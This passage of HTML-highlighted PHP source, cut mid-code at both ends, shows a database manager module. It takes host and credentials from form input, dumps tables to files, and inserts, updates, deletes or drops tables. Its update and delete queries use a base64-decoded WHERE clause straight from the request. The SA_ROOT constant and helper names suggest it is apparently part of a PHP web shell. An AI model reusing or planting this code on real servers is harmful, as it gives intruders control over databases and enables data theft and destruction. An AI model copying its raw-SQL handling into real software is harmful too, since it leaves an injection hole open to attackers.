!$<span style=\"color: #ffcc66;\">dbhost<\/span> &amp;&amp; $<span style=\"color: #ffcc66;\">dbhost<\/span> = <span style=\"color: #66cccc;\">'localhost'<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   !$<span style=\"color: #ffcc66;\">dbuser<\/span> &amp;&amp; $<span style=\"color: #ffcc66;\">dbuser<\/span> = <span style=\"color: #66cccc;\">'root'<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   !$<span style=\"color: #ffcc66;\">dbport<\/span> &amp;&amp; $<span style=\"color: #ffcc66;\">dbport<\/span> = <span style=\"color: #66cccc;\">'3306'<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">dbform<\/span> = <span style=\"color: #66cccc;\">'&lt;input type=\"hidden\" id=\"connect\" name=\"connect\" value=\"1\" \/&gt;'<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span>(<span style=\"color: #cccccc; background-color: #2d2d2d;\">isset(<\/span>$<span style=\"color: #ffcc66;\">dbhost<\/span>)){\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">dbform<\/span> .= <span style=\"color: #66cccc;\">\"&lt;input type=\\\"hidden\\\" id=\\\"dbhost\\\" name=\\\"dbhost\\\" value=\\<\/span><span style=\"color: #66cccc; text-decoration: underline;\">\"$dbhost\\\" \/&gt;\\n\"<\/span><span style=\"text-decoration: underline;\">;<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span>(<span style=\"color: #cccccc; background-color: #2d2d2d;\">isset(<\/span>$<span style=\"color: #ffcc66;\">dbuser<\/span>)) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">dbform<\/span> .= <span style=\"color: #66cccc;\">\"&lt;input type=\\\"hidden\\\" id=\\\"dbuser\\\" name=\\\"dbuser\\\" value=\\<\/span><span style=\"color: #66cccc; text-decoration: underline;\">\"$dbuser\\\" \/&gt;\\n\"<\/span><span style=\"text-decoration: underline;\">;<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span>(<span style=\"color: #cccccc; background-color: #2d2d2d;\">isset(<\/span>$<span style=\"color: #ffcc66;\">dbpass<\/span>)) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">dbform<\/span> .= <span style=\"color: #66cccc;\">\"&lt;input type=\\\"hidden\\\" id=\\\"dbpass\\\" name=\\\"dbpass\\\" value=\\<\/span><span style=\"color: #66cccc; text-decoration: underline;\">\"$dbpass\\\" \/&gt;\\n\"<\/span><span style=\"text-decoration: underline;\">;<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span>(<span style=\"color: #cccccc; background-color: #2d2d2d;\">isset(<\/span>$<span style=\"color: #ffcc66;\">dbport<\/span>)) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">dbform<\/span> .= <span style=\"color: #66cccc;\">\"&lt;input type=\\\"hidden\\\" id=\\\"dbport\\\" name=\\\"dbport\\\" value=\\<\/span><span style=\"color: #66cccc; text-decoration: underline;\">\"$dbport\\\" \/&gt;\\n\"<\/span><span style=\"text-decoration: underline;\">;<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span>(<span style=\"color: #cccccc; background-color: #2d2d2d;\">isset(<\/span>$<span style=\"color: #ffcc66;\">dbname<\/span>)) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">dbform<\/span> .= <span style=\"color: #66cccc;\">\"&lt;input type=\\\"hidden\\\" id=\\\"dbname\\\" name=\\\"dbname\\\" value=\\<\/span><span style=\"color: #66cccc; text-decoration: underline;\">\"$dbname\\\" \/&gt;\\n\"<\/span><span style=\"text-decoration: underline;\">;<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span>(<span style=\"color: #cccccc; background-color: #2d2d2d;\">isset(<\/span>$<span style=\"color: #ffcc66;\">charset<\/span>)) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">dbform<\/span> .= <span style=\"color: #66cccc;\">\"&lt;input type=\\\"hidden\\\" id=\\\"charset\\\" name=\\\"charset\\\" value<\/span><span style=\"color: #66cccc; text-decoration: underline;\">=\\\"$charset\\\" \/&gt;\\n\"<\/span><span style=\"text-decoration: underline;\">;<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   }\n\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> ($<span style=\"color: #ffcc66;\">doing<\/span> == <span style=\"color: #66cccc;\">'backupmysql'<\/span> &amp;&amp; $<span style=\"color: #ffcc66;\">saveasfile<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> (!$<span style=\"color: #ffcc66;\">table<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">m(<\/span><span style=\"color: #66cccc;\">'Please choose the table'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   } <span style=\"color: #99cc99;\">else<\/span> {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">mysqllink<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">mydbconn(<\/span>$<span style=\"color: #ffcc66;\">dbhost<\/span>,$<span style=\"color: #ffcc66;\">dbuser<\/span>,$<span style=\"color: #ffcc66;\">dbpass<\/span>,$<span style=\"color: #ffcc66;\">dbname<\/span>,$<span style=\"color: #ffcc66;\">charset<\/span>,$<span style=\"color: #ffcc66;\">dbpo<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">rt<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">fp<\/span> = @<span style=\"color: #cccccc; background-color: #2d2d2d;\">fopen(<\/span>$<span style=\"color: #ffcc66;\">path<\/span>,<span style=\"color: #66cccc;\">'w'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> ($<span style=\"color: #ffcc66;\">fp<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">foreach<\/span>($<span style=\"color: #ffcc66;\">table<\/span> <span style=\"color: #99cc99;\">as<\/span> $<span style=\"color: #ffcc66;\">k<\/span> =&gt; $<span style=\"color: #ffcc66;\">v<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> ($<span style=\"color: #ffcc66;\">v<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">sqldumptable(<\/span>$<span style=\"color: #ffcc66;\">v<\/span>, $<span style=\"color: #ffcc66;\">fp<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">fclose(<\/span>$<span style=\"color: #ffcc66;\">fp<\/span>);<span style=\"color: #f2777a; background-color: #515151;\">                <\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">fileurl<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">str_replace(<\/span><span style=\"color: #f2777a; font-weight: bold;\">SA_ROOT<\/span>,<span style=\"color: #66cccc;\">''<\/span>,$<span style=\"color: #ffcc66;\">path<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">m(<\/span><span style=\"color: #66cccc;\">'Database has success backup to &lt;a href=\"'<\/span>.$<span style=\"color: #ffcc66;\">fileurl<\/span>.<span style=\"color: #66cccc;\">'\" target=<\/span><span style=\"color: #66cccc; text-decoration: underline;\">\"_blank\"&gt;'<\/span><span style=\"text-decoration: underline;\">.$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">path<\/span><span style=\"text-decoration: underline;\">.<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'&lt;\/a&gt;'<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">mysql_close(<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   } <span style=\"color: #99cc99;\">else<\/span> {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">m(<\/span><span style=\"color: #66cccc;\">'Backup failed'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> ($<span style=\"color: #ffcc66;\">insert<\/span> &amp;&amp; $<span style=\"color: #ffcc66;\">insertsql<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">keystr<\/span> = $<span style=\"color: #ffcc66;\">valstr<\/span> = $<span style=\"color: #ffcc66;\">tmp<\/span> = <span style=\"color: #66cccc;\">''<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">foreach<\/span>($<span style=\"color: #ffcc66;\">insertsql<\/span> <span style=\"color: #99cc99;\">as<\/span> $<span style=\"color: #ffcc66;\">key<\/span> =&gt; $<span style=\"color: #ffcc66;\">val<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> ($<span style=\"color: #ffcc66;\">val<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">keystr<\/span> .= $<span style=\"color: #ffcc66;\">tmp<\/span><span style=\"color: #f2777a; font-weight: bold;\">.<\/span>$<span style=\"color: #ffcc66;\">key<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">valstr<\/span> .= $<span style=\"color: #ffcc66;\">tmp<\/span>.<span style=\"color: #66cccc;\">\"'\"<\/span>.<span style=\"color: #cccccc; background-color: #2d2d2d;\">addslashes(<\/span>$<span style=\"color: #ffcc66;\">val<\/span>).<span style=\"color: #66cccc;\">\"'\"<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">tmp<\/span> = <span style=\"color: #66cccc;\">','<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> ($<span style=\"color: #ffcc66;\">keystr<\/span> &amp;&amp; $<span style=\"color: #ffcc66;\">valstr<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">mysqllink<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">mydbconn(<\/span>$<span style=\"color: #ffcc66;\">dbhost<\/span>,$<span style=\"color: #ffcc66;\">dbuser<\/span>,$<span style=\"color: #ffcc66;\">dbpass<\/span>,$<span style=\"color: #ffcc66;\">dbname<\/span>,$<span style=\"color: #ffcc66;\">charset<\/span>,$<span style=\"color: #ffcc66;\">dbpo<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">rt<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">m(q(<\/span><span style=\"color: #66cccc;\">\"INSERT INTO $tablename ($keystr) VALUES ($valstr)\"<\/span>) ? <span style=\"color: #66cccc;\">'Insert n<\/span><span style=\"color: #66cccc; text-decoration: underline;\">ew record of success'<\/span><span style=\"text-decoration: underline;\"> : <\/span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">mysql_error(<\/span><span style=\"text-decoration: underline;\">));<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> ($<span style=\"color: #ffcc66;\">update<\/span> &amp;&amp; $<span style=\"color: #ffcc66;\">insertsql<\/span> &amp;&amp; $<span style=\"color: #ffcc66;\">base64<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">valstr<\/span> = $<span style=\"color: #ffcc66;\">tmp<\/span> = <span style=\"color: #66cccc;\">''<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">foreach<\/span>($<span style=\"color: #ffcc66;\">insertsql<\/span> <span style=\"color: #99cc99;\">as<\/span> $<span style=\"color: #ffcc66;\">key<\/span> =&gt; $<span style=\"color: #ffcc66;\">val<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">valstr<\/span> .= $<span style=\"color: #ffcc66;\">tmp<\/span><span style=\"color: #f2777a; font-weight: bold;\">.<\/span>$<span style=\"color: #ffcc66;\">key<\/span>.<span style=\"color: #66cccc;\">\"='\"<\/span>.<span style=\"color: #cccccc; background-color: #2d2d2d;\">addslashes(<\/span>$<span style=\"color: #ffcc66;\">val<\/span>).<span style=\"color: #66cccc;\">\"'\"<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">tmp<\/span> = <span style=\"color: #66cccc;\">','<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> ($<span style=\"color: #ffcc66;\">valstr<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">where<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">base64_decode(<\/span>$<span style=\"color: #ffcc66;\">base64<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">mysqllink<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">mydbconn(<\/span>$<span style=\"color: #ffcc66;\">dbhost<\/span>,$<span style=\"color: #ffcc66;\">dbuser<\/span>,$<span style=\"color: #ffcc66;\">dbpass<\/span>,$<span style=\"color: #ffcc66;\">dbname<\/span>,$<span style=\"color: #ffcc66;\">charset<\/span>,$<span style=\"color: #ffcc66;\">dbpo<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">rt<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">m(q(<\/span><span style=\"color: #66cccc;\">\"UPDATE $tablename SET $valstr WHERE $where LIMIT 1\"<\/span>) ? <span style=\"color: #66cccc;\">'Record <\/span><span style=\"color: #66cccc; text-decoration: underline;\">updating'<\/span><span style=\"text-decoration: underline;\"> : <\/span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">mysql_error(<\/span><span style=\"text-decoration: underline;\">));<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> ($<span style=\"color: #ffcc66;\">doing<\/span> == <span style=\"color: #66cccc;\">'del'<\/span> &amp;&amp; $<span style=\"color: #ffcc66;\">base64<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">where<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">base64_decode(<\/span>$<span style=\"color: #ffcc66;\">base64<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">delete_sql<\/span> = <span style=\"color: #66cccc;\">\"DELETE FROM $tablename WHERE $where\"<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">mysqllink<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">mydbconn(<\/span>$<span style=\"color: #ffcc66;\">dbhost<\/span>,$<span style=\"color: #ffcc66;\">dbuser<\/span>,$<span style=\"color: #ffcc66;\">dbpass<\/span>,$<span style=\"color: #ffcc66;\">dbname<\/span>,$<span style=\"color: #ffcc66;\">charset<\/span>,$<span style=\"color: #ffcc66;\">dbport<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">m(q(<\/span><span style=\"color: #66cccc;\">\"DELETE FROM $tablename WHERE $where\"<\/span>) ? <span style=\"color: #66cccc;\">'Deletion record of success<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'<\/span><span style=\"text-decoration: underline;\"> : <\/span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">mysql_error(<\/span><span style=\"text-decoration: underline;\">));<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   }\n\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> ($<span style=\"color: #ffcc66;\">tablename<\/span> &amp;&amp; $<span style=\"color: #ffcc66;\">doing<\/span> == <span style=\"color: #66cccc;\">'drop'<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">mysqllink<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">mydbconn(<\/span>$<span style=\"color: #ffcc66;\">dbhost<\/span>,$<span style=\"color: #ffcc66;\">dbuser<\/span>,$<span style=\"color: #ffcc66;\">dbpass<\/span>,$<span style=\"color: #ffcc66;\">dbname<\/span>,$<span style=\"color: #ffcc66;\">charset<\/span>,$<span style=\"color: #ffcc66;\">dbport<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> (<span style=\"color: #cccccc; background-color: #2d2d2d;\">q(<\/span><span style=\"color: #66cccc;\">\"DROP TABLE $tablename\"<\/span>)) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">m(<\/span><span style=\"color: #66cccc;\">'Drop table of success'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">tablename<\/span> = <span style=\"color: #66cccc;\">''<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   } <span style=\"color: #99cc99;\">else<\/span> {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">m(mysql_error(<\/span>));\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   }\n\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">formhead(array(<\/span><span style=\"color: #66cccc;\">'title'<\/span>=&gt;<span style=\"color: #66cccc;\">'MYSQL Manager'<\/span>));\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">makehide(<\/span><span style=\"color: #66cccc;\">'action'<\/span>,<span style=\"color: #66cccc;\">'mysqladmin'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;p&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'DBHost:'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">makeinput(array(<\/span><span style=\"color: #66cccc;\">'name'<\/span>=&gt;<span style=\"color: #66cccc;\">'dbhost'<\/span>,<span style=\"color: #66cccc;\">'size'<\/span>=&gt;<span style=\"color: #cccccc; background-color: #2d2d2d;\">20<\/span>,<span style=\"color: #66cccc;\">'value'<\/span>=&gt;$<span style=\"color: #ffcc66;\">dbhost<\/span>));\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">':'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">makeinput(array(<\/span><span style=\"color: #66cccc;\">'name'<\/span>=&gt;<span style=\"color: #66cccc;\">'dbport'<\/span>,<span style=\"color: #66cccc;\">'size'<\/span>=&gt;<span style=\"color: #cccccc; background-color: #2d2d2d;\">4<\/span>,<span style=\"color: #66cccc;\">'value'<\/span>=&gt;$<span style=\"color: #ffcc66;\">dbport<\/span>));\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'DBUser:'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">makeinput(array(<\/span><span style=\"color: #66cccc;\">'name'<\/span>=&gt;<span style=\"color: #66cccc;\">'dbuser'<\/span>,<span style=\"color: #66cccc;\">'size'<\/span>=&gt;<span style=\"color: #cccccc; background-color: #2d2d2d;\">15<\/span>,<span style=\"color: #66cccc;\">'value'<\/span>=&gt;$<span style=\"color: #ffcc66;\">dbuser<\/span>));\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'DBPass:'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">makeinput(array(<\/span><span style=\"color: #66cccc;\">'name'<\/span>=&gt;<span style=\"color: #66cccc;\">'dbpass'<\/span>,<span style=\"color: #66cccc;\">'size'<\/span>=&gt;<span style=\"color: #cccccc; background-color: #2d2d2d;\">15<\/span>,<span style=\"color: #66cccc;\">'value'<\/span>=&gt;$<span style=\"color: #ffcc66;\">dbpass<\/span>));\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'DBCharset:'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">makeselect(array(<\/span><span style=\"color: #66cccc;\">'name'<\/span>=&gt;<span style=\"color: #66cccc;\">'charset'<\/span>,<span style=\"color: #66cccc;\">'option'<\/span>=&gt;$<span style=\"color: #ffcc66;\">charsetdb<\/span>,<span style=\"color: #66cccc;\">'selected'<\/span>=&gt;$<span style=\"color: #ffcc66;\">charset<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'nokey'<\/span><span style=\"text-decoration: underline;\">=&gt;<\/span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">1<\/span><span style=\"text-decoration: underline;\">));<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">makeinput(array(<\/span><span style=\"color: #66cccc;\">'name'<\/span>=&gt;<span style=\"color: #66cccc;\">'connect'<\/span>,<span style=\"color: #66cccc;\">'value'<\/span>=&gt;<span style=\"color: #66cccc;\">'Connect'<\/span>,<span style=\"color: #66cccc;\">'type'<\/span>=&gt;<span style=\"color: #66cccc;\">'submit'<\/span>,<span style=\"color: #66cccc;\">'class<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'<\/span><span style=\"text-decoration: underline;\">=&gt;<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'bt'<\/span><span style=\"text-decoration: underline;\">));<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;\/p&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">formfoot(<\/span>);\n\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #999999; font-style: italic;\">\/\/<\/span><span style=\"color: #999999; font-style: italic;\">&#25805;&#20316;&#35760;&#24405;<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">formhead(array(<\/span><span style=\"color: #66cccc;\">'name'<\/span>=&gt;<span style=\"color: #66cccc;\">'recordlist'<\/span>));\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">makehide(<\/span><span style=\"color: #66cccc;\">'doing'<\/span>);\n<span style=\"background-color: #515151;\"> 